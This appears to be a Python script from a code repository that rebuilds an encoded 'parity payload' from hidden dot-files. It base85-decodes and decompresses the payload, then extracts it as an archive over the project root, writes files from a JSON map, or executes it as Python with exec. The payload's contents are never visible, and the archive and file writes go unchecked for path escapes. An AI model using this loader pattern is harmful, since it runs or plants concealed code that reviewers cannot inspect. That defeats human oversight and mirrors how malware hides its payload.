#!/usr/bin/env python3
from __future__ import annotations

import base64
import bz2
import gzip
import io
import json
import lzma
import pathlib
import tarfile
import traceback
import zipfile
import zlib

ROOT = pathlib.Path(__file__).resolve().parents[1]
ERROR_FILE = ROOT / "scripts" / "parity_payload_error.txt"


def apply_payload() -> None:
    parts = sorted((ROOT / "scripts").glob(".parity_payload_*.txt"))
    if not parts:
        raise SystemExit("No parity payload parts found")

    encoded = "".join(part.read_text(encoding="utf-8").strip() for part in parts)
    packed = base64.b85decode(encoded.encode("ascii"))

    payload = packed
    for decoder in (zlib.decompress, gzip.decompress, bz2.decompress, lzma.decompress):
        try:
            payload = decoder(packed)
            break
        except Exception:
            continue

    if payload.startswith(b"PK\x03\x04"):
        with zipfile.ZipFile(io.BytesIO(payload)) as archive:
            archive.extractall(ROOT)
        return

    try:
        with tarfile.open(fileobj=io.BytesIO(payload), mode="r:*") as archive:
            archive.extractall(ROOT)
            return
    except tarfile.ReadError:
        pass

    text = payload.decode("utf-8")
    stripped = text.lstrip()
    if stripped.startswith("{"):
        obj = json.loads(text)
        files = obj.get("files", obj)
        if not isinstance(files, dict):
            raise TypeError("JSON payload must contain a file mapping")
        for relative, content in files.items():
            target = ROOT / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(str(content), encoding="utf-8")
        return

    namespace = {
        "__name__": "__main__",
        "__file__": str(ROOT / "scripts" / "decoded_parity_payload.py"),
        "ROOT": ROOT,
    }
    exec(compile(text, namespace["__file__"], "exec"), namespace)


try:
    apply_payload()
except BaseException:
    ERROR_FILE.write_text(traceback.format_exc(), encoding="utf-8")
    raise
else:
    ERROR_FILE.unlink(missing_ok=True)
    print("Parity payload applied successfully")
